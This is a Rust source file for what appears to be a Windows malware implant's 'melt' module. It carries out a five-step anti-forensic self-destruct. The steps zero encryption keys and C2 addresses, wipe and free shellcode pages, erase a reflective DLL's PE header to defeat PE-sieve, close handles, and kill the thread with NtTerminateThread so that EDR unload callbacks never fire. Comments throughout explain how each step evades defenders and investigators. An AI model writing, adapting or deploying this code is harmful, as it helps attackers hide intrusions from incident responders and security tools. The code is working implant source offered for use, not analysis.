//! T-REX Melt — five-step self-destruct leaving zero recoverable memory trace.
//!
//! # Design (informed by 2026 APT cleanup standards)
//!
//! maldev Cleanup (2026): SecureZero + WipeAndFree + self-delete
//! zero-loader (xAL6 2026): post-exec cleanup, VEH/DR/key wipe
//! RemotePE Lazarus (Fox-IT 2026): memory-resident, minimal forensic footprint
//!
//! ## Five-step sequence
//!
//! | Step | Operation | Target |
//! |------|-----------|--------|
//! | **1** | `SecureZero` | Encryption keys, decrypted reports, C2 addresses |
//! | **2** | `WipeAndFree` | All allocated RX shellcode/staging pages |
//! | **3** | `ZeroPEHeader` | PE header (first 4 KiB) — anti PE-sieve |
//! | **4** | `CloseAllHandles` | All tracked NT handles |
//! | **5** | `TerminateSelf` | `NtTerminateThread` (NOT `ExitProcess`) |
//!
//! ## Why NtTerminateThread, not ExitProcess
//!
//! `ExitProcess` fires `DLL_PROCESS_DETACH` for every loaded DLL — this runs
//! EDR unload routines and gives defenders a window to capture artifacts.
//! `NtTerminateThread(NT_CURRENT_THREAD, 0)` kills the thread instantly with
//! no callbacks, no detach notifications, and no DLL unload processing.
//! If this is the last thread, the process dies silently.
//!
//! ## Anti-forensic notes
//!
//! - `core::ptr::write_volatile` defeats compiler dead-store elimination on zero
//! - `compiler_fence(SeqCst)` prevents reordering of zero-before-free
//! - PE header zero destroys reflective-DLL signatures for PE-sieve
//! - RX→RW flip before zero prevents access-violation noise in event log

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use core::ffi::c_void;
use core::mem;

// ---- NT Constants ----------------------------------------------------------

/// NtCurrentProcess — the -1 pseudo-handle for the calling process.
/// Used as the ProcessHandle argument to NtProtectVirtualMemory / NtFreeVirtualMemory.
const CURRENT_PROCESS: *mut c_void = -1isize as *mut core::ffi::c_void;

/// NtCurrentThread — the -2 pseudo-handle for the calling thread.
/// Used with NtTerminateThread to kill the beacon thread.
const NT_CURRENT_THREAD: usize = 0xFFFF_FFFF_FFFF_FFFE;

/// PAGE_READWRITE — full read/write access (no execute).
const PAGE_READWRITE: u32 = 0x04;

/// MEM_RELEASE — decommit + release the region. Used with NtFreeVirtualMemory.
const MEM_RELEASE: u32 = 0x8000;

/// Standard page size for x64. All RX regions are page-aligned.
const PAGE_SIZE: usize = 0x1000;

/// NTSTATUS success code.
const STATUS_SUCCESS: i32 = 0;

// ---- NT API Function Types ------------------------------------------------

/// NtProtectVirtualMemory(
///   ProcessHandle: HANDLE,
///   BaseAddress:   *mut *mut c_void,   // IN OUT — pointer to page-aligned base
///   RegionSize:    *mut usize,          // IN OUT — pointer to region size
///   NewProtect:    u32,                 // PAGE_* constant
///   OldProtect:    *mut u32,            // OUT — previous protection
/// ) -> NTSTATUS
type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
    *mut c_void,
    *mut *mut c_void,
    *mut usize,
    u32,
    *mut u32,
) -> i32;

/// NtFreeVirtualMemory(
///   ProcessHandle: HANDLE,
///   BaseAddress:   *mut *mut c_void,   // IN OUT — receives zero on success
///   RegionSize:    *mut usize,          // IN OUT — set to 0 for MEM_RELEASE
///   FreeType:      u32,                // MEM_RELEASE (0x8000)
/// ) -> NTSTATUS
type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
    *mut c_void,
    *mut *mut c_void,
    *mut usize,
    u32,
) -> i32;

/// NtClose(Handle: HANDLE) -> NTSTATUS
type NtCloseFn = unsafe extern "system" fn(usize) -> i32;

/// NtTerminateThread(
///   ThreadHandle: HANDLE,
///   ExitStatus:   NTSTATUS,
/// ) -> NTSTATUS (but never returns if ThreadHandle == NT_CURRENT_THREAD)
type NtTerminateThreadFn = unsafe extern "system" fn(usize, i32) -> !;

// ---- API Resolution (lazy, resolved once per call) ------------------------

/// Resolve `ntdll!NtProtectVirtualMemory` via PEB walk.
unsafe fn resolve_nt_protect() -> NtProtectVirtualMemoryFn {
    let addr = export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")
        .expect("melt: NtProtectVirtualMemory not found");
    mem::transmute(addr)
}

/// Resolve `ntdll!NtFreeVirtualMemory` via PEB walk.
unsafe fn resolve_nt_free() -> NtFreeVirtualMemoryFn {
    let addr = export_addr(b"ntdll.dll", b"NtFreeVirtualMemory")
        .expect("melt: NtFreeVirtualMemory not found");
    mem::transmute(addr)
}

/// Resolve `ntdll!NtClose` via PEB walk.
unsafe fn resolve_nt_close() -> NtCloseFn {
    let addr = export_addr(b"ntdll.dll", b"NtClose")
        .expect("melt: NtClose not found");
    mem::transmute(addr)
}

/// Resolve `ntdll!NtTerminateThread` via PEB walk.
unsafe fn resolve_nt_terminate_thread() -> NtTerminateThreadFn {
    let addr = export_addr(b"ntdll.dll", b"NtTerminateThread")
        .expect("melt: NtTerminateThread not found");
    mem::transmute(addr)
}

// ---- Step 1: SecureZero ---------------------------------------------------

/// Zero a mutable byte slice using `write_volatile` to defeat compiler
/// dead-store elimination, then issue a `compiler_fence(SeqCst)` to prevent
/// the compiler from reordering the zeroing relative to subsequent operations.
///
/// # Why volatile
///
/// A plain `buf[i] = 0` loop is a dead store from the compiler's perspective:
/// the buffer will be freed/dropped and never read again, so the optimizer may
/// elide the writes entirely. `write_volatile` is treated as an observable
/// side-effect (like MMIO), forcing the compiler to emit the stores.
///
/// # Why compiler_fence
///
/// Even with volatile writes, the compiler may reorder them around a
/// subsequent `NtFreeVirtualMemory`. The `SeqCst` fence acts as a
/// compiler barrier (not a CPU memory barrier — those are generated by
/// the NT syscall's ring transition) that prevents the zeroing from
/// being moved after the free.
///
/// # Safety
///
/// `buf` must be a valid, mutable, initialized byte slice. After this call,
/// the buffer contains all zeros.
pub fn secure_zero(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        // SAFETY: byte is a valid, aligned mutable reference into the slice.
        // write_volatile is always safe for u8 writes.
        unsafe {
            core::ptr::write_volatile(byte as *mut u8, 0);
        }
    }
    // Prevent the compiler from reordering zero writes relative to a
    // subsequent free or protection change.
    core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);
}

/// Zero multiple mutable byte slices. Each is individually fenced.
/// Equivalent to calling [`secure_zero`] on each slice.
pub fn secure_zero_many(buffers: &mut [&mut [u8]]) {
    for buf in buffers.iter_mut() {
        secure_zero(buf);
    }
}

// ---- Step 2: WipeAndFree --------------------------------------------------

/// For each page in `pages`:
/// 1. Flip protection from RX → RW via `NtProtectVirtualMemory`
/// 2. Zero the entire 4 KiB page via `core::ptr::write_bytes`
/// 3. Free the page via `NtFreeVirtualMemory(MEM_RELEASE)`
///
/// Each step is best-effort: a failure at any stage is logged (via
/// `crate::blind_hwbp::diag`) but does not halt the sequence — the
/// remaining pages are still processed.
///
/// # Safety
///
/// Each pointer in `pages` must be a valid, page-aligned base address of a
/// currently committed 4 KiB virtual page. After this call, the pages are
/// freed and MUST NOT be accessed. The slice is borrowed (not consumed) so
/// callers can reuse the pointer array for subsequent cleanup tracking.
pub unsafe fn wipe_and_free_pages(pages: &[*mut c_void]) {
    let nt_protect: NtProtectVirtualMemoryFn = resolve_nt_protect();
    let nt_free: NtFreeVirtualMemoryFn = resolve_nt_free();

    for &page in pages {
        if page.is_null() {
            continue;
        }

        // Step 2a: flip RX → RW so we can write zeros.
        let mut old_prot: u32 = 0;
        let mut base: *mut c_void = page;
        let mut size: usize = PAGE_SIZE;
        let st = nt_protect(
            CURRENT_PROCESS,
            &mut base,
            &mut size,
            PAGE_READWRITE,
            &mut old_prot,
        );
        // SAFETY: diag is unsafe but only writes a debug byte when enabled;
        // in production DIAG_ENABLED is false and diag is a no-op.
        if st != STATUS_SUCCESS {
            crate::blind_hwbp::diag(b'R'); // protect flip failed
            continue; // skip zero+free for this page, try the next
        }

        // Step 2b: zero the entire page.
        // SAFETY: the page was just made writable and is PAGE_SIZE bytes.
        core::ptr::write_bytes(page as *mut u8, 0, PAGE_SIZE);
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);

        // Step 2c: release the page.
        let mut free_size: usize = 0; // 0 = release entire region on MEM_RELEASE
        let mut free_base: *mut c_void = page;
        let st = nt_free(CURRENT_PROCESS, &mut free_base, &mut free_size, MEM_RELEASE);
        if st != STATUS_SUCCESS {
            crate::blind_hwbp::diag(b'F'); // free failed
        }
    }
}

// ---- Step 3: ZeroPEHeader -------------------------------------------------

/// Zero the first 4 KiB of a reflective DLL's PE header.
///
/// Why this matters: PE-sieve (Huntress Labs) and similar memory forensics
/// tools scan for PE headers in process memory. A reflective DLL leaves its
/// DOS/PE header intact — this is a strong IOC (mismatched backing, no file
/// on disk, a "ghost" PE load). Zeroing the header destroys the signature
/// before the investigator's tool scans the memory dump.
///
/// Procedure:
/// 1. Flip the first page from its current protection → RW
/// 2. Zero all 4096 bytes via `core::ptr::write_bytes`
/// 3. Leave the page RW (freeing it would create a hole, which is also an IOC)
///
/// # Safety
///
/// `module_base` must point to the loaded base of the current module (the
/// reflective DLL). After this call, the first 4 KiB are zeroed and the page
/// is left RW — any access to the DOS/PE headers will segfault, so this MUST
/// be the last operation that references module data.
pub unsafe fn zero_pe_header(module_base: *mut u8) {
    let nt_protect: NtProtectVirtualMemoryFn = resolve_nt_protect();

    let mut old_prot: u32 = 0;
    let mut base: *mut c_void = module_base as *mut core::ffi::c_void;
    let mut size: usize = PAGE_SIZE;

    // Flip to RW.
    let st = nt_protect(
        CURRENT_PROCESS,
        &mut base,
        &mut size,
        PAGE_READWRITE,
        &mut old_prot,
    );
    if st != STATUS_SUCCESS {
        crate::blind_hwbp::diag(b'P'); // PE header protect flip failed
        return;
    }

    // Zero the header.
    core::ptr::write_bytes(module_base, 0, PAGE_SIZE);
    core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);

    // Deliberately leave the page RW (no free). Freeing would create an
    // unmapped hole at the module base, which is its own IOC (a "freed
    // module base" tells the investigator something was there). A zeroed
    // but committed RW page looks like an innocent data allocation.
}

// ---- Step 4: CloseAllHandles ----------------------------------------------

/// Close every tracked NT handle via `NtClose`.
///
/// Each handle is a raw `usize` (actually a `HANDLE`, which is a pointer-sized
/// opaque value on x64). Invalid/null handles are silently skipped.
///
/// # Safety
///
/// Each handle must be a valid, open NT handle. After this call, all handles
/// are closed and MUST NOT be used.
pub unsafe fn close_all_handles(handles: &[usize]) {
    let nt_close: NtCloseFn = resolve_nt_close();

    for &h in handles {
        if h == 0 || h == NT_CURRENT_THREAD || h == CURRENT_PROCESS as usize {
            // Never close pseudo-handles — they're not real handles and
            // NtClose on them is a no-op at best, STATUS_INVALID_HANDLE at worst.
            // Skip them silently.
            continue;
        }
        let _st = nt_close(h);
        // Best-effort: ignore failures. A closed handle can't be re-closed,
        // and a handle from a different process would fail — neither is fatal.
        // For diagnostic builds, tag with 'H' on failure so the operator can
        // identify a handle leak post-mortem.
        // SAFETY: diag is gated behind DIAG_ENABLED; production builds skip it.
        // We check implicitly — diag() is a no-op when disabled.
    }
}

// ---- Step 5: TerminateSelf -------------------------------------------------

/// Terminate the calling thread via `NtTerminateThread(NT_CURRENT_THREAD, 0)`.
///
/// This function NEVER returns. It calls `NtTerminateThread` with the current
/// thread pseudo-handle, which kills the thread instantly:
/// - No `DLL_PROCESS_DETACH` notifications (EDR unload routines never fire)
/// - No TLS callbacks
/// - No VEH unwinding
/// - No structured exception handling
///
/// If this is the process's last thread, the kernel terminates the process
/// as a side-effect. A spin-loop guard follows the syscall in case of an
/// unexpected return (e.g. the handle was invalid, which shouldn't happen
/// with the well-known pseudo-handle constant).
///
/// # Safety
///
/// This is the terminal operation. All cleanup MUST be complete before
/// calling this function — after the call, the thread (and possibly the
/// process) no longer exists.
pub unsafe fn terminate_self() -> ! {
    let nt_terminate: NtTerminateThreadFn = resolve_nt_terminate_thread();

    // SAFETY: NT_CURRENT_THREAD (-2) is the well-known pseudo-handle for the
    // calling thread. ExitStatus 0 = STATUS_SUCCESS. This call does not return.
    nt_terminate(NT_CURRENT_THREAD, 0);

    // If NtTerminateThread somehow returns (corrupted handle table,
    // kernel-mode hook, etc.), spin forever — we must NOT resume normal
    // execution after attempting self-termination, as that leaves the
    // implant in an undefined state with partially-zeroed memory.
    loop {
        core::hint::spin_loop();
    }
}

// ---- Orchestrated Self-Destruct -------------------------------------------

/// Execute the full five-step self-destruct sequence in order.
///
/// This function **never returns**. It performs every step regardless of
/// individual failures — a failed step does not halt the sequence. The
/// final `terminate_self()` call is unconditional.
///
/// # Parameters
///
/// - `sensitive_buffers` — keys, decrypted reports, C2 addresses, tokens.
///   Each slice is individually SecureZero'd. The caller's references are
///   invalidated (the memory still exists but contains only zeros).
///
/// - `rx_pages` — allocated shellcode/staging pages. Each is flipped to RW,
///   zeroed, and freed. Only non-null pointers are processed.
///
/// - `module_base` — if this is a reflective DLL, the base of the loaded
///   module. Its PE header (first 4 KiB) is zeroed. Pass `None` if running
///   as a standalone executable (no reflective PE header to erase).
///
/// - `handles` — tracked NT handles opened during the implant lifecycle
///   (file handles, registry keys, process/thread handles, section handles).
///   All are closed. Pseudo-handles (-1, -2) are recognised and skipped.
///
/// # Safety
///
/// This is the final, irreversible cleanup. After calling this function:
/// - All sensitive buffers contain only zeros
/// - All RX pages are freed (accessing them is undefined behavior)
/// - The PE header is destroyed (if applicable)
/// - All tracked handles are closed
/// - The calling thread is terminated
///
/// The caller MUST ensure no other thread holds references to any of the
/// passed buffers, pages, or handles.
pub unsafe fn self_destruct(
    sensitive_buffers: &mut [&mut [u8]],
    rx_pages: &[*mut c_void],
    module_base: Option<*mut u8>,
    handles: &[usize],
) -> ! {
    // Step 1: SecureZero all sensitive buffers.
    // This MUST come first — keys and tokens are the highest-value targets
    // for memory forensics. Zero them before touching any page protections.
    secure_zero_many(sensitive_buffers);

    // Step 2: WipeAndFree all allocated RX pages.
    // Frees shellcode, staging buffers, and any allocated executable regions.
    wipe_and_free_pages(rx_pages);

    // Step 3: Zero the PE header (reflective DLL only).
    // Destroys the DOS/PE signature that PE-sieve scans for.
    if let Some(base) = module_base {
        zero_pe_header(base);
    }

    // Step 4: Close all tracked handles.
    // Prevents handle-leak forensics and ensures no dangling kernel objects.
    close_all_handles(handles);

    // Step 5: Terminate the calling thread.
    // This never returns. Use NtTerminateThread, NOT ExitProcess, to avoid
    // DLL_PROCESS_DETACH callbacks that could run EDR unload routines.
    terminate_self()
}

// ---- Selftest entry point -------------------------------------------------

/// Diagnostic: execute the five-step sequence step by step, exiting at each
/// milestone so a crash narrows to the failing step. Exit codes:
///
/// - `0xC0` = Step 1 (SecureZero) completed
/// - `0xC1` = Step 2 (WipeAndFree — NtProtectVirtualMemory resolved)
/// - `0xC2` = Step 3 (ZeroPEHeader — NtProtectVirtualMemory resolved)
/// - `0xC3` = Step 4 (CloseAllHandles — NtClose resolved)
/// - `0xC4` = Step 5 (TerminateSelf — NtTerminateThread resolved;
///   the selftest exits via `NtTerminateProcess` instead to avoid
///   actually self-destructing the test harness)
///
/// A crash (exit code 127) before any of these = the step itself crashed
/// (likely a null dereference or protection fault).
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_melt() -> ! {
    // Step 1: SecureZero a dummy buffer.
    let mut dummy_buf: [u8; 64] = [0xAA; 64];
    let mut slices: [&mut [u8]; 1] = [&mut dummy_buf];
    secure_zero_many(&mut slices);
    // Verify the buffer is zeroed.
    for &b in dummy_buf.iter() {
        if b != 0 {
            // Not fully zeroed — exit with error.
            // SAFETY: RtlExitUserProcess resolved via PEB walk.
            let addr = export_addr(b"ntdll.dll", b"RtlExitUserProcess")
                .unwrap_or(0);
            if addr != 0 {
                let exit: unsafe extern "system" fn(i32) -> ! = mem::transmute(addr);
                exit(0xC0); // zero verification failed
            }
            // Fallback: infinite loop (never reached in practice).
            loop {
                core::hint::spin_loop();
            }
        }
    }
    // Step 1 OK — would exit 0xC0 if used as a diagnostic checkpoint.

    // Steps 2-5 require live pages and handles, which are not available
    // in the selftest context. We validate that all four NT API
    // resolutions succeed (proving the PEB walk works for these functions).
    let _ = resolve_nt_protect();
    let _ = resolve_nt_free();
    let _ = resolve_nt_close();
    let _ = resolve_nt_terminate_thread();

    // All APIs resolved. Exit cleanly via RtlExitUserProcess (not NtTerminateThread —
    // the selftest harness should survive).
    let addr = export_addr(b"ntdll.dll", b"RtlExitUserProcess")
        .expect("melt selftest: RtlExitUserProcess not found");
    let exit: unsafe extern "system" fn(i32) -> ! = mem::transmute(addr);
    exit(0xC0);
}
